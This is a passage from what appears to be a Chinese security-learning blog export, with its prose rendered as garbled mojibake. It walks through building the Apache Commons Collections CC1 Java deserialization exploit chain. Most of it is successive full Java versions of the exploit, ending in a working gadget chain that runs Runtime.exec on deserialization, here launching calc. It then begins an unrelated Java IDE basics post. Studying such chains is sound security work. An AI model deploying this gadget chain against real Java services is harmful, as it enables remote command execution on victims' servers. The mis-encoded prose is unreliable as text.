Entry:transformdMap.entrySet()){\n        //            Entry.setValue(r); //æ³¨æ„æˆ‘ä»¬è¿™é‡Œéƒ½æ˜¯åœ¨ä¼ ä¸€ä¸ªå¯¹è±¡\n        //        }\n        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n        annotationConstructor.setAccessible(true);\n        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n        serialize(o);\n        unserialize(\"ser.ser\");\n\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\né‚£ä¹ˆå†è®©æˆ‘ä»¬æ‰§è¡Œä¸€æ¬¡ å®ƒæ²¡æœ‰æˆåŠŸ \n\né‚£ä¹ˆé—®é¢˜å‡ºåœ¨å“ªé‡Œäº†å‘¢\n\n## é—®é¢˜\n\n### ä¸€ \n\nRuntimeç±»å¹¶æ²¡æœ‰Serializableæ¥å£ æ‰€ä»¥æ— æ³•è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651832445-20317b70-a0ea-4741-89d1-4938e8510062.png)\n\næ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡åå°„è·å¾—å®ƒçš„åŸå‹ç±» åŸå‹ç±»Classå…·æœ‰Serializableæ¥å£çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651916837-e8b8d76e-9f07-4fd5-90eb-e9151d360092.png)\n\nå®ƒæœ‰ä¸€ä¸ª`getRuntime()`æ–¹æ³•  æ³¨æ„ä¸€ä¸‹è¿™é‡Œæ˜¯æ²¡æœ‰å‚æ•°ä¼ å…¥çš„\n\nå¯ä»¥çœ‹åˆ°ç›´æ¥è¿”å›ä¸€ä¸ªRuntimeå¯¹è±¡ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥åå°„è°ƒç”¨ \n\n ä¹Ÿå°±æ˜¯å•åˆ—æ¨¡å¼![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695652059596-2a448c28-832c-4a01-ac74-9f1d31bdb344.png)\n\nè·å¾—å¯ä»¥ååºåˆ—åŒ–çš„å¯¹è±¡å’Œexecæ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695653868021-b3411c20-86c3-4d6f-9c6a-663813b39b08.png)\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n\n\n\n\n\n\n\n\n\n        Class runtimeReflection = Class.forName(\"java.lang.Runtime\");\n        Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //è·å¾—å¯¹è±¡\n        Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//é™æ€æ–¹æ³•æ— å¯¹è±¡ æ— å‚æ–¹æ³•\n        //å†æ¥è·å–execæ–¹æ³•\n        Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n//        HashMap<Object, Object> map = new HashMap<>(); //å…ˆåˆ›å»ºä¸€ä¸ªmapå¯¹è±¡\n//        map.put(\"Z1d10t\",\"Z1d10t\");//ä»»æ„å¡«\n//        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //æ³¨æ„æˆ‘ä»¬è¿™é‡Œéƒ½æ˜¯åœ¨ä¼ ä¸€ä¸ªå¯¹è±¡\n////        }\n//        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n//        annotationConstructor.setAccessible(true);\n//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n//        serialize(o);\n//        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\n### ä¼˜åŒ–\n\nä¼˜åŒ–ä¸ºæˆ‘ä»¬ä¸€å¼€å§‹çš„`InvokerTransformer`è°ƒç”¨å½¢å¼\n\nè¿™é‡Œç›´æ¥ç»™transformç©¿äº†ä¸€ä¸ª`Runtime.class` è¿™æ˜¯ä¸€ä¸ªç±»å¯¹è±¡ æœ¬è´¨ä¸Šä¹Ÿæ˜¯å¯¹è±¡\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        //æ”¹ä¸ºInvokerTransformerè°ƒç”¨å½¢å¼\n        Method rReflectionMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class\n        ,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);//Runtime.classæ³¨æ„è¿™é‡Œç”¨æ³•\n        Runtime r = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n                new Object[]{null, null}).transform(rReflectionMethod);\n        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r);\n\n\n\n\n\n\n\n\n\n        Class runtimeReflection = Runtime.class;\n        //Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //è·å¾—å¯¹è±¡\n        //Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//é™æ€æ–¹æ³•æ— å¯¹è±¡ æ— å‚æ–¹æ³•\n        //å†æ¥è·å–execæ–¹æ³•\n        //Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        //exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n//        HashMap<Object, Object> map = new HashMap<>(); //å…ˆåˆ›å»ºä¸€ä¸ªmapå¯¹è±¡\n//        map.put(\"Z1d10t\",\"Z1d10t\");//ä»»æ„å¡«\n//        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //æ³¨æ„æˆ‘ä»¬è¿™é‡Œéƒ½æ˜¯åœ¨ä¼ ä¸€ä¸ªå¯¹è±¡\n////        }\n//        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n//        annotationConstructor.setAccessible(true);\n//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n//        serialize(o);\n//        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\nå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªå¥—ä¸€ä¸ªçš„å½¢å¼ æœ‰ç‚¹å¥—å¨ƒ é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ä¸ªç±»ç›´æ¥å¸®æˆ‘ä»¬è¿›è¡Œå¥—å¨ƒè°ƒç”¨å‘¢ \n\nç­”æ¡ˆæ˜¯æœ‰çš„`ChainedTransformer`ç±»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695655664035-d609bad6-2da1-4e83-9e60-013efaa89ca6.png)\n\næ„é€ å‡½æ•°æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬é“¾å¼è°ƒç”¨çš„å†…å®¹æ•°ç»„ä¼ è¿›å» ç„¶åå®ƒçš„`transform()`å°±å¯ä»¥å¸®æˆ‘ä»¬è¿›è¡Œé“¾å¼è°ƒç”¨\n\nçœŸæ˜¯å¤ªé…·å•¦\n\næœ€åä¼˜åŒ–åçš„ä»£ç \n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        //æ”¹ä¸ºInvokerTransformerè°ƒç”¨å½¢å¼\n//        Method rReflectionMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class\n//        ,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);//Runtime.classæ³¨æ„è¿™é‡Œç”¨æ³•\n//        Runtime r = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n//                new Object[]{null, null}).transform(rReflectionMethod);\n//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r);\n        Transformer[] transformers = new Transformer[]{\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class\n                        ,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n                        new Object[]{null, null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        chainedTransformer.transform(Runtime.class);//Runtime.classåªæœ‰è¿™é‡Œæ˜¯æˆ‘ä»¬å¯æ§ å…¶ä»–éƒ½æ˜¯å¥—å¨ƒ è¿™é‡Œéœ€è¦ç†è§£\n\n\n        //Class runtimeReflection = Runtime.class;\n        //Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //è·å¾—å¯¹è±¡\n        //Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//é™æ€æ–¹æ³•æ— å¯¹è±¡ æ— å‚æ–¹æ³•\n        //å†æ¥è·å–execæ–¹æ³•\n        //Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        //exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n//        HashMap<Object, Object> map = new HashMap<>(); //å…ˆåˆ›å»ºä¸€ä¸ªmapå¯¹è±¡\n//        map.put(\"Z1d10t\",\"Z1d10t\");//ä»»æ„å¡«\n//        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //æ³¨æ„æˆ‘ä»¬è¿™é‡Œéƒ½æ˜¯åœ¨ä¼ ä¸€ä¸ªå¯¹è±¡\n////        }\n//        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n//        annotationConstructor.setAccessible(true);\n//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n//        serialize(o);\n//        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\nè®°å¾—è¦å°†mapè¿™é‡Œç¨åŠ ä¿®æ”¹ä¸€ä¸‹ å¯¹è±¡å˜äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656279030-c5c4fa98-dd90-4c9b-91e2-838323fea8d0.png)\n\n### äºŒ\n\nè®°å¾—35è¡Œè¦æ³¨é‡Šæ‰\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        //æ”¹ä¸ºInvokerTransformerè°ƒç”¨å½¢å¼\n//        Method rReflectionMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class\n//        ,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);//Runtime.classæ³¨æ„è¿™é‡Œç”¨æ³•\n//        Runtime r = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n//                new Object[]{null, null}).transform(rReflectionMethod);\n//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r);\n        Transformer[] transformers = new Transformer[]{\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class\n                        ,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n                        new Object[]{null, null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        //chainedTransformer.transform(Runtime.class);//Runtime.classåªæœ‰è¿™é‡Œæ˜¯æˆ‘ä»¬å¯æ§ å…¶ä»–éƒ½æ˜¯å¥—å¨ƒ è¿™é‡Œéœ€è¦ç†è§£\n\n\n        //Class runtimeReflection = Runtime.class;\n        //Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //è·å¾—å¯¹è±¡\n        //Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//é™æ€æ–¹æ³•æ— å¯¹è±¡ æ— å‚æ–¹æ³•\n        //å†æ¥è·å–execæ–¹æ³•\n        //Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        //exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n        HashMap<Object, Object> map = new HashMap<>(); //å…ˆåˆ›å»ºä¸€ä¸ªmapå¯¹è±¡\n        map.put(\"Z1d10t\",\"Z1d10t\");//ä»»æ„å¡«\n        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null,chainedTransformer );\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //æ³¨æ„æˆ‘ä»¬è¿™é‡Œéƒ½æ˜¯åœ¨ä¼ ä¸€ä¸ªå¯¹è±¡\n////        }\n        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n        annotationConstructor.setAccessible(true);\n        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n        serialize(o);\n        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\nè‡³æ­¤è¿˜æ˜¯æ‰§è¡Œä¸äº† å› ä¸ºæ‰§è¡Œ`AnnotationInvocationHandler`ä¸‹çš„`readObject()`æˆ‘ä»¬æœ‰æ¡ä»¶æ²¡æœ‰æ»¡è¶³\n\næœ‰ä¸¤ä¸ªifè¯­å¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656475842-9c59a2b1-a290-4f18-950f-a4c2b380716f.png)\n\næ‰“ä¸¤ä¸ªæ–­ç‚¹æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656614798-185efa8a-81cd-45f1-97e0-1dcb2d11d4d8.png)\n\nå‘ç°ç¬¬ä¸€ä¸ªæ¡ä»¶`memberType != null`æ˜¯ä¸æ»¡è¶³çš„ å°±ç›´æ¥å‡ºæ¥äº†\n\nè¿™é‡ŒmemeberTypeæ˜¯è·å–æ³¨è§£ä¸­æˆå‘˜å˜é‡çš„åç§°ï¼Œç„¶åå¹¶ä¸”æ£€æŸ¥é”®å€¼å¯¹ä¸­é”®åæ˜¯å¦æœ‰å¯¹åº”çš„åç§°ï¼Œè€Œæˆ‘ä»¬æ‰€ä½¿ç”¨çš„æ³¨è§£Overrideæ˜¯æ²¡æœ‰æˆå‘˜å˜é‡çš„ æ‰€ä»¥å¾—æ‰¾ä¸€ä¸ªæœ‰æˆå‘˜å˜é‡çš„æ³¨è§£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656950483-53b96348-5425-422d-a469-e49e1187758f.png)\n\nTargetæ³¨è§£ æ³¨æ„è¿™é‡Œvalue()å¹¶ä¸æ˜¯å‡½æ•° è€Œæ˜¯å®ƒçš„å±æ€§ å­¦æ³¨è§£çš„æ—¶å€™æœ‰æ³¨æ„åˆ°è¿™ä¸ª\n\nå› æ­¤è¦å°†`Object o = annotationConstructor.newInstance(Override.class, transformdMap);` \n\nOverrideæ”¹ä¸ºTarget\n\nå¹¶ä¸”æŠŠè¿™å—çš„keyæ”¹ä¸ºvalue\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657243795-18fd1e65-1765-4493-b6e2-d2fe0cbc3ba6.png)\n\nç»ˆäºè¿›æ¥äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657219389-97bbbae7-153d-4e31-882a-8b5730df1bec.png)\n\n## ä¸‰\n\nåœ¨setValueçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼ å…¥çš„valueå€¼æ ¹æœ¬å°±ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„Runtime.class\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657573479-621fe54d-1c93-4702-bde2-f209cdf81b42.png)\n\né‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆæŠŠä»–è½¬å›æˆ‘ä»¬æƒ³è¦çš„å€¼å‘¢\n\nè¿™é‡Œç”¨åˆ°äº†`ConstantTransformer`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657728441-bb8f818a-51f2-4d0e-ab7d-02bedce9c460.png)\n\nè¿™ä¸ªç±»é‡Œé¢ä¹Ÿæœ‰transformï¼Œå’Œæ„é€ å‡½æ•°é…åˆä½¿ç”¨çš„è¯\n\næ— è®ºæˆ‘ä»¬ä¼ å…¥ä»€ä¹ˆå€¼ï¼Œå°±ä¼šè¿”å›æ„é€ å‡½æ•°ä¼ çš„é‚£ä¸ªå€¼ï¼Œè¿™æ ·å°±èƒ½å°†valueçš„å€¼è½¬ä¸º`Runtime.class`\n\nè‡³æ­¤æ‰€æœ‰çš„é“¾å°±ç»“æŸäº†\n\næœ€ç»ˆä»£ç ï¼š\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        //æ”¹ä¸ºInvokerTransformerè°ƒç”¨å½¢å¼\n//        Method rReflectionMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class\n//        ,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);//Runtime.classæ³¨æ„è¿™é‡Œç”¨æ³•\n//        Runtime r = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n//                new Object[]{null, null}).transform(rReflectionMethod);\n//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r);\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class\n                        ,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n                        new Object[]{null, null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        //chainedTransformer.transform(Runtime.class);//Runtime.classåªæœ‰è¿™é‡Œæ˜¯æˆ‘ä»¬å¯æ§ å…¶ä»–éƒ½æ˜¯å¥—å¨ƒ è¿™é‡Œéœ€è¦ç†è§£\n        Class runtimeReflection = Runtime.class;\n        \n        //Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //è·å¾—å¯¹è±¡\n        //Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//é™æ€æ–¹æ³•æ— å¯¹è±¡ æ— å‚æ–¹æ³•\n        //å†æ¥è·å–execæ–¹æ³•\n        //Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        //exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n        HashMap<Object, Object> map = new HashMap<>(); //å…ˆåˆ›å»ºä¸€ä¸ªmapå¯¹è±¡\n        map.put(\"value\",\"Z1d10t\");//ä»»æ„å¡«\n        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null,chainedTransformer );\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //æ³¨æ„æˆ‘ä»¬è¿™é‡Œéƒ½æ˜¯åœ¨ä¼ ä¸€ä¸ªå¯¹è±¡\n////        }\n        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n        annotationConstructor.setAccessible(true);\n        Object o = annotationConstructor.newInstance(Target.class, transformdMap);\n        serialize(o);\n        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\n# åè¨€ï¼š\n\nè™½ç„¶è·Ÿç€è§†é¢‘èµ„æ–™ä¸€æ­¥ä¸€æ­¥è·Ÿè¿‡æ¥äº† ä½†æ˜¯è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ è¿˜æ˜¯å¾—å¤šè°ƒè¯•å¤šæƒ³ \n\nç´¯äº† è°ƒäº†å‡ å¤©äº† ç»ˆäºç»“æŸäº†\n\n# æ„Ÿè°¢ï¼š\n\nç»„é•¿[Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=67f50016dfc916b4c141ffd179381426)\n\nä½¬æ–‡ç«  [JAVAå®‰å…¨åˆæ¢(ä¸‰):CC1é“¾å…¨åˆ†æ - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/12669#toc-3)\n","categories":["çŸ¥è¯†å­¦ä¹ "]},{"title":"JAVAåŸºç¡€","url":"/post/43d73074.html","content":"\nJAVAåŸºç¡€\n\n<!--more-->\n\n# IDEA\n\næ„Ÿè§‰æ­£å¼javaä¹‹æ—…ä¹‹å‰è¿˜æ˜¯è¦å…ˆç¨å¾®äº†è§£IDEAçš„åŸºæœ¬çŸ¥è¯†ï¼Œä¸ç„¶å¾ˆéš¾è¿›è¡Œä¸‹å»ã€‚\n\n## åˆ›å»ºé¡¹ç›®å‰ç½®çŸ¥è¯†\n\nIDEAä¸­æœ€å¤§çš„å•ä½åº”è¯¥æ˜¯project\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434114278-f9c87cd4-0ea5-4145-a87c-2c81ee693b8a.png)\n\nå¯ä»¥ç†è§£ä¸ºæ˜¯workspace\n\nç„¶åæ˜¯directoryã€moduleå’Œpackage\n\npackageæ˜¯JAVAç±»çš„å‘½åç©ºé—´ é¿å…ç±»åé‡å¤ \n\nåŠ å…¥æˆ‘ä»¬åˆ›å»ºcom.Z1d10t é‚£ä¹ˆå°±ä¼šåœ¨æœ¬åœ°åˆ›å»ºåµŒå¥—çš„æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694440895043-26781dca-312f-4a75-9d22-dd34da27a0c2.png)\n\nè¿™ä¸¤ä¸ªå±‚çº§åº”è¯¥æ˜¯ä¸€æ ·çš„éƒ½æ˜¯ä½äºproject ä½†æ˜¯æœ‰äº›å·®å¼‚\n\nmoduleä¸€èˆ¬æ˜¯æˆ‘ä»¬ç”¨äºæ„å»ºæºä»£ç çš„æ–‡ä»¶å¤¹ï¼Œç”¨äºç»„ç»‡é¡¹ç›®çš„ä¸åŒéƒ¨åˆ†\n\nè€Œdirectoryæ˜¯æ™®é€šæ–‡ä»¶å¤¹ å°±æ¯”å¦‚æˆ‘ä»¬åœ¨ç”µè„‘ä¸Šæ™®é€šçš„æ–‡ä»¶å¤¹ 